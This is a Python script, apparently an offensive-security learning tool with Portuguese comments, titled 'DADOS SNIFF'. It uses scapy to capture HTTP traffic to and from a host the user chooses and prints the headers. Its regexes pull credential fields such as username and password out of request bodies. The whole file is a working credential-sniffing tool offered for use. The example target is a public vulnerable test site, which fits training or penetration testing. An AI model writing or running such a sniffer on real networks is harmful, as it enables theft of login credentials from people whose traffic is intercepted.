from scapy.all import sniff, IP, TCP
import socket
import re
from colorama import Fore, Style, init

# Inicializando o colorama
init(autoreset=True)
print(Fore.LIGHTCYAN_EX + Style.BRIGHT + """

██████╗  █████╗ ██████╗  ██████╗ ███████╗    ███████╗███╗   ██╗██╗███████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝████╗  ██║██║██╔════╝██╔════╝
██║  ██║███████║██║  ██║██║   ██║███████╗    ███████╗██╔██╗ ██║██║█████╗  █████╗  
██║  ██║██╔══██║██║  ██║██║   ██║╚════██║    ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  
██████╔╝██║  ██║██████╔╝╚██████╔╝███████║    ███████║██║ ╚████║██║██║     ██║     
╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     
                                                                                   
""")

def get_ip_from_url(url):
    """Resolve o endereço IP de um domínio."""
    try:
        domain = re.match(r'(https?://)?([^/]+)', url).group(2)
        ip_address = socket.gethostbyname(domain)
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[INFO] website: {domain}  Endereço IP:  {ip_address}")
        return ip_address
    except Exception as e:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[ERRO] Não foi possível resolver o IP: {e}")
        return None

def extract_http_data(payload):
    """Extrai cabeçalhos HTTP e dados (ex: username=test&password=test) de um payload."""
    try:
        # Decodificar o payload em texto
        payload_text = bytes(payload).decode(errors='ignore')
        if "HTTP" in payload_text or "GET" in payload_text or "POST" in payload_text:
            headers_body_split = payload_text.split("\r\n\r\n", 1)
            headers = headers_body_split[0]
            body = headers_body_split[1] if len(headers_body_split) > 1 else None

            # Filtrar parâmetros específicos como username, password, uname, pass, etc.
            if body:
                filtered_data = filter_body_data(body)
                return headers, filtered_data
            return headers, None
        return None, None
    except Exception:
        return None, None

def filter_body_data(body):
    """Filtra e extrai dados de interesse no corpo da requisição HTTP."""
    # Definir um padrão para os parâmetros que queremos capturar
    params = ['username', 'password', 'uname', 'pass', 'uid', 'passw']
    filtered_data = {}

    for param in params:
        # Procurar por cada parâmetro e extrair seu valor
        match = re.search(rf"(?<={param}=)([^&]+)", body)
        if match:
            filtered_data[param] = match.group(0)

    return filtered_data

def packet_callback(packet):
    """Callback para processar pacotes capturados."""
    if IP in packet and TCP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_dport = packet[TCP].dport
        tcp_sport = packet[TCP].sport
        payload = packet[TCP].payload

        # Verifica se o pacote é relevante (HTTP geralmente usa portas 80 ou 443)
        if tcp_dport in [80, 443] or tcp_sport in [80, 443]:
            headers, body_data = extract_http_data(payload)
            if headers:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[INFO] Pacote HTTP capturado")
                print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"\nDe: {ip_src} Para: {ip_dst}")
                print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nCabeçalho HTTP")
                print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + headers)
                if body_data:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + "\nDados Filtrados do Corpo HTTP")
                    for key, value in body_data.items():
                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"{key}: {value}")

def main():
    while True:
        try:
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\nDigite nome do website ou a URL (ex: http://testphp.vulnweb.com): ", end='')
            url = input()
            ip = get_ip_from_url(url)
            
            if ip:
                print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"\n[INFO] Capturando pacotes HTTP do host: {ip}")
                
                # Captura pacotes relacionados ao IP resolvido
                sniff(filter=f"host {ip}", prn=packet_callback, store=False)
            else:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + "[INFO] URL inválida. Tente novamente.")
        except KeyboardInterrupt:
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\n[INFO] Captura interrompida. O script continuará em execução.")
            continue
        except PermissionError:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + "[ERRO] Permissão negada! Execute o script como administrador (root).")
            break
        except Exception as e:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[ERRO] Ocorreu um erro: {e}")
            continue

if __name__ == "__main__": 
    main()

